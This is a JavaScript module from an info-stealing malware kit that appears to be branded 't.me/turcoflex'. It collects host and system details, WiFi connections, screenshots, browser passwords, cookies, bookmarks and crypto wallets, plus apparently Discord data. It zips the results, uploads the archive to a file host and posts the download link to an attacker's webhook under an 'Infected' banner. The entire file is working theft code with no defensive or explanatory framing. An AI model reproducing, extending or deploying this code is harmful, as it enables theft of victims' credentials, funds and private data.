module.exports = (client) => {
  return {
    async get_user_info() {
      let cpus = [];

      for (var cpu of client.config.user.cpus) {
        cpus.push(client.utils.encryption.decryptData(cpu));
      }

      let pc_info_text =
        "<================[   User Info   ]>================>\n<================[t.me/turcoflex]>================>\n\n";
      let fields = [];

      const wifi_connections = await client.config.user.wifi_connections();

      for (let [key, value] of Object.entries({
        "🖥️ CPU(s)": cpus.join("\n"),
        "⚡ RAM": client.utils.encryption.decryptData(client.config.user.ram),
        "🛑 Version": client.utils.encryption.decryptData(
          client.config.user.version
        ),
        "⏳ Uptime": client.utils.encryption.decryptData(
          client.config.user.uptime
        ),
        "📂 Host directory": client.utils.encryption.decryptData(
          client.config.user.hostdir
        ),
        "🆔 Host name": client.utils.encryption.decryptData(
          client.config.user.hostname
        ),
        "🆔 PC Name": client.utils.encryption.decryptData(
          client.config.user.username
        ),
        "👻 Type": client.utils.encryption.decryptData(client.config.user.type),
        "🏹 Arch": client.utils.encryption.decryptData(client.config.user.arch),
        "📢 Release": client.utils.encryption.decryptData(
          client.config.user.release
        ),
        "🌌 AppData Path": client.utils.encryption.decryptData(
          client.config.user.appdata
        ),
        "🪐 Temp Path": client.utils.encryption.decryptData(
          client.config.user.temp
        ),
        "🌐 User Domain": client.utils.encryption.decryptData(
          client.config.user.user_domain
        ),
        "💨 System Drive": client.utils.encryption.decryptData(
          client.config.user.system_drive
        ),
        "💾 Processors": client.utils.encryption.decryptData(
          client.config.user.processors
        ),
        "💾 Processor Identifier": client.utils.encryption.decryptData(
          client.config.user.processor_identifier
        ),
        "💾 Processor Architecture": client.utils.encryption.decryptData(
          client.config.user.processor_architecture
        ),
      })) {
        pc_info_text += `${key}: ${value}\n`;
        fields.push({
          name: key,
          value: `\`\`\`${value}\`\`\``,
          inline: true,
        });
      }

      let wifi_connections_text = `<================[WiFi connections]>================>\n<================[t.me/turcoflex ]>================>\n\n${wifi_connections}`;

      client.utils.jszip.createTxt(
        "\\WiFi Connections.txt",
        wifi_connections_text
      );
      client.utils.jszip.createTxt("\\User Info.txt", pc_info_text);

      return client.utils.webhook.createEmbed({
        fields: fields,
      });
    },

    get_executable_info() {
      let executable_info_text =
        "<================[Executable Info]>================>\n<================[t.me/turcoflex]>================>\n\n";
      let fields = [];

      for (let [key, value] of Object.entries({
        "☠️ Execution path": client.utils.encryption.decryptData(
          client.config.executable.execution_path
        ),
        "🅿️ Debug port": client.config.executable.debug_port,
        "🔢 PID": client.config.executable.pid,
        "🔢 PPID": client.config.executable.ppid,
      })) {
        fields.push({
          name: key,
          value: `\`\`\`${value}\`\`\``,
          inline: false,
        });
        executable_info_text += `${key}: ${value}\n`;
      }
      client.utils.jszip.createTxt(
        "\\Executable Info.txt",
        executable_info_text
      );

      return client.utils.webhook.createEmbed({
        fields: fields,
      });
    },

    async initialize() {
      try {
        await this.get_user_info();
      } catch {}
      try {
        this.get_executable_info();
      } catch {}
      try {
        await this.infect();
      } catch {}
      try {
        await this.send_zip();
      } catch (err) {
        try {
          await client.utils.webhook.sendToWebhook({
            embeds: [
              client.utils.webhook.createEmbed({
                title: `⚠️ Could not send log`,
                description: `\`\`\`${err}\`\`\``,
              }),
            ],
          });
        } catch {}
      }
    },

    getFolderFiles(path_prefix, path) {
      var result = "";

      for (var file of client.requires.fs.readdirSync(
        `${path_prefix}\\${path}`
      )) {
        var file_size_in_kb = (
          client.requires.fs.statSync(`${path_prefix}\\${path}\\${file}`).size /
          1024
        ).toFixed(2);
        if (
          !client.requires.fs
            .statSync(`${path_prefix}\\${path}\\${file}`)
            .isDirectory()
        ) {
          if (file.includes(".txt")) {
            result += `📄 ${path}/${file} - ${file_size_in_kb} KB\n`;
          } else if (file.includes(".png")) {
            result += `🖼️ ${path}/${file} - ${file_size_in_kb} KB\n`;
          } else {
            result += `🥙 ${path}/${file} - ${file_size_in_kb} KB\n`;
          }
        } else {
          result += this.getFolderFiles(`${path_prefix}\\`, `${path}/${file}`);
        }
      }

      return result;
    },

    async send_zip() {
      try {
        await client.utils.browsers.saveBrowserStuff();
      } catch (err) {
        try {
          await client.utils.webhook.sendToWebhook({
            embeds: [
              client.utils.webhook.createEmbed({
                title: `⚠️ Could not save browser stuff`,
                description: `\`\`\`${err}\`\`\``,
              }),
            ],
          });
        } catch {}
      }

      try {
        await client.utils.jszip.createZip();
      } catch (err) {
        try {
          await client.utils.webhook.sendToWebhook({
            embeds: [
              client.utils.webhook.createEmbed({
                title: `⚠️ Could not create zip file`,
                description: `\`\`\`${err}\`\`\``,
              }),
            ],
          });
        } catch {}
      }

      const upload = await client.utils.gofile.uploadFile(
        client.requires.fs.createReadStream(`${client.config.jszip.path}.zip`)
      );

      var counter_embed = this.create_counter_embed();

      counter_embed.description = `**[Download the zip file](${upload.downloadPage})**`;

      await client.utils.webhook.sendToWebhook({
        embeds: [counter_embed],
      });
    },

    create_counter_embed() {
      let obj = {
        title: `💉 Infected - ${client.utils.encryption.decryptData(
          client.config.user.hostname
        )}/${client.utils.encryption.decryptData(
          client.config.user.user_domain
        )}/${client.utils.encryption.decryptData(client.config.user.username)}`,
        footer: {
          text: client.utils.encryption.decryptData(
            client.config.embed.footer.text
          ),
          icon_url: client.utils.encryption.decryptData(
            client.config.embed.footer.icon_url
          ),
        },
        fields: [],
        timestamp: new Date(),
      };

      let cpus = [];

      for (var cpu of client.config.user.cpus) {
        cpus.push(client.utils.encryption.decryptData(cpu));
      }

      for (let [key, value] of Object.entries({
        "🔑 Passwords": client.config.counter.passwords,
        "🍪 Cookies": client.config.counter.cookies,
        "🔖 Bookmarks": client.config.counter.bookmarks,
        "💰 Wallets": client.config.counter.wallets,
        "📶 Wifi networks": client.config.counter.wifinetworks,
      })) {
        obj["fields"].push({
          name: key,
          value: `\`\`\`${value}\`\`\``,
          inline: true,
        });
      }

      return obj;
    },

    async get_screenshot() {
      client.requires.screenshot.listDisplays().then((displays) => {
        var random_uuid = client.requires.crypto.randomUUID();
        Object.entries(displays).forEach(async (key, value) => {
          client.config.counter.screenshots++;
          client.requires.screenshot({
            screen: key[1].id,
            format: "png",
            filename: `${client.config.jszip.path}/${random_uuid}_DISPLAY_${
              parseInt(key[0]) + 1
            }.png`,
          });
        });
      });
    },

    async infect() {
      await this.get_screenshot(client.config.webhook.url);

      await client.utils.discord.init();
    },
  };
};
